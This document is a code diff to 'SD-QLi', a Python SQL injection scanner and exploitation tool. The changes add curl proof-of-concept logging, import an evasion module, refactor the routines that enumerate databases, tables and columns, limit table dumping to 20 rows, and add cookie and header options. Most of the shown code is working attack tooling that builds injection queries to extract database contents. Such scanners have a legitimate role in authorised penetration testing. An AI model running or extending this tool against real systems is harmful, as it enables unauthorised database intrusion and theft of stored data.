@@ -1,9 +1,4 @@
 #!/usr/bin/env python3
-"""
-SD-QLi v1.1: ADVANCED AUTOMATED SQLi SCANNER
-High-speed SQL injection scanner and automated exploitation framework.
-Designed for rapid enumeration and professional vulnerability discovery.
-"""
 
 import requests
 import time
@@ -14,6 +9,7 @@ import re
 import urllib.parse
 from concurrent.futures import ThreadPoolExecutor
 from threading import Lock
+from evasion_utils import EvasionEngine, ResultsLogger
 
 # Color palette for premium feel
 class Colors:
@@ -27,12 +23,13 @@ class Colors:
     END = '\033[0m'
 
 class SDQLi:
-    def __init__(self, url, method='GET', data=None, headers=None, workers=10, timeout=3):
+    def __init__(self, url, method='GET', data=None, headers=None, workers=10, timeout=3, args=None):
         self.url = url
         self.method = method.upper()
         self.data = data # POST data as string or dict
         self.max_workers = workers
         self.timeout = timeout
+        self.args = args
         
         self.session = requests.Session()
         if headers:
@@ -201,6 +198,9 @@ class SDQLi:
                                 if vuln not in self.results['vulnerabilities']:
                                     self.results['vulnerabilities'].append(vuln)
                                     print(f"  {Colors.GREEN}[+]{Colors.END} Found: {Colors.CYAN}{db_type} Error-based{Colors.END}")
+                                    
+                                    proof = f"curl -i \"{self.url}?{param_name}={urllib.parse.quote(current_params[param_name])}\""
+                                    ResultsLogger.log_finding("SD-QLi", f"{db_type} Error-based SQLi", self.url, proof)
                             return True
             except: pass
             finally: current_params[param_name] = original_val
@@ -246,6 +246,9 @@ class SDQLi:
                             vuln = {'type': 'Time-based', 'db_type': db, 'param': param_name, 'payload': payload, 'full_payload': current_params[param_name]}
                             self.results['vulnerabilities'].append(vuln)
                             print(f"  {Colors.GREEN}[+]{Colors.END} Found: {Colors.CYAN}{db} Time-based{Colors.END}")
+                            
+                            proof = f"curl -i \"{self.url}?{param_name}={urllib.parse.quote(current_params[param_name])}\""
+                            ResultsLogger.log_finding("SD-QLi", f"{db} Time-based SQLi", self.url, proof)
                         return True
                 except: pass
                 finally: current_params[param_name] = original_val
@@ -277,6 +280,9 @@ class SDQLi:
                         vuln = {'type': 'Boolean-blind', 'param': param_name, 'payload': t_pay, 'full_payload': f"{original_val}{t_pay}"}
                         self.results['vulnerabilities'].append(vuln)
                         print(f"  {Colors.GREEN}[+]{Colors.END} Found: {Colors.CYAN}Boolean-blind{Colors.END}")
+                        
+                        proof = f"curl -i \"{self.url}?{param_name}={urllib.parse.quote(current_params[param_name])}\""
+                        ResultsLogger.log_finding("SD-QLi", "Boolean-blind SQLi", self.url, proof)
                     return True
             except: pass
             finally: current_params[param_name] = original_val
@@ -468,18 +474,20 @@ class SDQLi:
 
     def automate_harvest(self, param_name, current_params, col_count, ref_idx, prefix=None):
         """Recursive Global Harvesting (v2.6)"""
+        if not self.args: return
+
         # Prioritize CLI flags (Targeted mode)
-        if any([args.dbs, args.tables, args.columns, args.dump]):
-            if args.dbs: self.get_databases(param_name, current_params, col_count, ref_idx, prefix=prefix)
-            if args.tables:
-                db = args.db or self.results['database'] or "current"
+        if any([self.args.dbs, self.args.tables, self.args.columns, self.args.dump]):
+            if self.args.dbs: self.get_databases(param_name, current_params, col_count, ref_idx, prefix=prefix)
+            if self.args.tables:
+                db = self.args.db or self.results['database'] or "current"
                 self.get_tables(param_name, current_params, col_count, ref_idx, db=db, prefix=prefix)
-            if args.columns:
-                if not args.table: print(f"{Colors.RED}[!] Specify table with -T.{Colors.END}")
-                else: self.get_columns(param_name, current_params, col_count, ref_idx, args.table, db=args.db, prefix=prefix)
-            if args.dump:
-                if not args.table: print(f"{Colors.RED}[!] Specify table with -T.{Colors.END}")
-                else: self.dump_table(param_name, current_params, col_count, ref_idx, args.table, cols=args.col.split(',') if args.col else None, db=args.db, prefix=prefix)
+            if self.args.columns:
+                if not self.args.table: print(f"{Colors.RED}[!] Specify table with -T.{Colors.END}")
+                else: self.get_columns(param_name, current_params, col_count, ref_idx, self.args.table, db=self.args.db, prefix=prefix)
+            if self.args.dump:
+                if not self.args.table: print(f"{Colors.RED}[!] Specify table with -T.{Colors.END}")
+                else: self.dump_table(param_name, current_params, col_count, ref_idx, self.args.table, cols=self.args.col.split(',') if self.args.col else None, db=self.args.db, prefix=prefix)
             return
 
         # Global Full-Auto Mode (v2.6 Recursion)
@@ -666,9 +674,9 @@ class SDQLi:
         original_val = current_params[param_name]
         start_val = prefix if prefix else original_val
         
-        # We'll dump rows one by one for robustness, or use GROUP_CONCAT for speed
+        # We'll dump a limited number of rows (20) for proof-of-concept safety
         col_list = f"CONCAT_WS(0x7c, {','.join(cols)})"
-        query = f"(SELECT GROUP_CONCAT({col_list} SEPARATOR 0x0a) FROM {db+'.' if db else ''}{table})"
+        query = f"(SELECT GROUP_CONCAT(t.payload SEPARATOR 0x0a) FROM (SELECT {col_list} as payload FROM {db+'.' if db else ''}{table} LIMIT 20) t)"
         
         temp_cols = [f"'{i}'" for i in range(1, col_count + 1)]
         marker = "DUMP_EXPORT"
@@ -848,6 +856,9 @@ def main():
     parser.add_argument('-r', '--request', help='Raw request file (Burp-style)')
     parser.add_argument('-w', '--workers', type=int, default=10, help='Number of threads')
     parser.add_argument('-t', '--timeout', type=int, default=3, help='Request timeout')
+    parser.add_argument('-e', '--encode', choices=['none', 'all'], default='none', help='Global encoding')
+    parser.add_argument('--cookie', help='Custom cookie')
+    parser.add_argument('--header', action='append', help='Custom headers')
     
     # Enumeration Flags (v2.3)
     parser.add_argument('--dbs', action='store_true', help='Enumerate databases')
@@ -858,10 +869,19 @@ def main():
     parser.add_argument('-T', dest='table', help='Table to enumerate')
     parser.add_argument('-C', dest='col', help='Columns to enumerate (comma-sep)')
     
-    global args
     args = parser.parse_args()
     
-    headers = None
+    headers = {}
+    if args.header:
+        for head in args.header:
+            try:
+                k, v = head.split(':', 1)
+                headers[k.strip()] = v.strip()
+            except: pass
+            
+    if args.cookie:
+        headers['Cookie'] = args.cookie
+
     url = args.url
     method = args.method
     data = args.data
@@ -881,7 +901,7 @@ def main():
         parser.print_help()
         sys.exit(1)
     
-    scanner = SDQLi(url, method=method, data=data, headers=headers, workers=args.workers, timeout=args.timeout)
+    scanner = SDQLi(url, method=method, data=data, headers=headers, workers=args.workers, timeout=args.timeout, args=args)
     try:
         scanner.run()
     except KeyboardInterrupt:
